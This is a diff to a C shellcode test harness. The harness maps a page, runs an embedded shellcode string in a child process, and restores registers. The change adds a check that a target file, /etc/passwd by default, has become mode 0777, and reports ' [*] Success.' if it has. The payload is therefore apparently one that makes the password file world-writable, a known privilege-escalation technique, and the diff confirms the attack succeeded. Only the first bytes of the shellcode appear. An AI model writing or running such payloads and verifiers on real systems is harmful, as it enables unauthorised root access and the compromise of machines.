@@ -1,3 +1,4 @@
+#include <fcntl.h>
 #include <stdio.h>
 #include <string.h>
 
@@ -5,8 +6,9 @@
 #include <strings.h>
 #endif
 
-#include <sys/types.h>
 #include <sys/mman.h>
+#include <sys/stat.h>
+#include <sys/types.h>
 #include <sys/utsname.h>
 #include <sys/wait.h>
 #include <unistd.h>
@@ -15,12 +17,17 @@
 #define unused(x) ((void)(x))
 #endif
 
+#ifndef __victim_path
+#define __victim_path "/etc/passwd"
+#endif
+
 int main(int argc, char **argv) {
   unused(argc);
   unused(argv);
 
   int ret, wstatus;
   pid_t pid;
+  struct stat st;
   struct utsname uts;
   char *pcall;
   char *shellcode = "\x33\xf6\x56\x68\x73\x73\x77\x64"
@@ -78,6 +85,21 @@ int main(int argc, char **argv) {
     waitpid(pid, &wstatus, WUNTRACED | WCONTINUED);
   }
 
+  bzero(&st, sizeof(struct stat));
+
+  if ((ret = stat(__victim_path, &st)) < 0) {
+    perror("stat()");
+    goto __must_restore_regs;
+  }
+
+  if (st.st_mode != 0777) {
+    printf(" [-] Fail.\n");
+    ret = -1;
+    goto __must_restore_regs;
+  }
+
+  printf(" [*] Success.\n");
+
   printf("[*] Restoring register state..\n");
   store_regs(&__serialize_regs(cregs));
 
@@ -85,6 +107,9 @@ int main(int argc, char **argv) {
   munmap(pcall, sysconf(_SC_PAGESIZE));
 
   return 0;
+
+__must_restore_regs:
+  store_regs(&__serialize_regs(cregs));
 
 __must_unmap:
   munmap(pcall, sysconf(_SC_PAGESIZE));
